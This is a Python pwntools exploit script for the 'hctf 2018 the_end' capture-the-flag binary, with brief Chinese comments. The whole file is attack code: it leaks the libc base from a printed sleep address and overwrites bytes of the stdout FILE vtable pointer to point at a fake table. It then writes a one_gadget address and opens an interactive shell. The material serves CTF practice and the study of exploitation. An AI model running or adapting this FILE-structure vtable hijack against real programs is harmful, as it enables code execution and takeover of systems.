# encoding=utf-8
from pwn import *
from LibcSearcher import *
s = lambda buf: io.send(buf)
sl = lambda buf: io.sendline(buf)
sa = lambda delim, buf: io.sendafter(delim, buf)
sal = lambda delim, buf: io.sendlineafter(delim, buf)
shell = lambda: io.interactive()
r = lambda n=None: io.recv(n)
ra = lambda t=tube.forever:io.recvall(t)
ru = lambda delim: io.recvuntil(delim)
rl = lambda: io.recvline()
rls = lambda n=2**20: io.recvlines(n)
 
elf = ELF('./data/bin/heap23_37_hctf_2018_the_end')
libc = elf.libc
#io = remote("node3.buuoj.cn",26000)
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
io = process('./data/bin/heap23_37_hctf_2018_the_end')


def change(addr1,byte):
    s(p64(addr1))
    s(p8(byte))

io = process('./data/bin/heap23_37_hctf_2018_the_end')
#get_proc_base(io)
#get_libc_base(io)
ru("here is a gift ")
libc.address =  int(r(len("0x7f7819bef2b0")),16)-libc.sym['sleep']
success("libc:"+hex(libc.address))
#gdb.attach(io)

ru("good luck ;)")
ogg = libc.address+0xf0364
stdout_vtable_ptr = libc.sym['_IO_2_1_stdout_']+0xd8
stderr_vtable_ptr = libc.sym['_IO_2_1_stderr_']+0xd8    # 虚表劫持
success("stdout_addr:"+hex(stdout_vtable_ptr))
success("stderr_addr:"+hex(stderr_vtable_ptr))
fake_vtable_addr = stderr_vtable_ptr-0x58          # fake虚表的位置
success("fake vtable addr:"+hex(fake_vtable_addr))


change(stdout_vtable_ptr,(fake_vtable_addr&0xff))
change(stdout_vtable_ptr+1,((fake_vtable_addr>>8)&0xff))   #劫持stdout结构体的虚表指针指向fake table的位置(_IO_2_1_stderr_+128)

ogg = libc.address+0x45226
gdb.attach(io)

success("ogg:"+hex(ogg))
change(stderr_vtable_ptr,ogg&0xff)
change(stderr_vtable_ptr+1,((ogg>>8)&0xff))
change(stderr_vtable_ptr+2,((ogg>>16)&0xff))

shell()
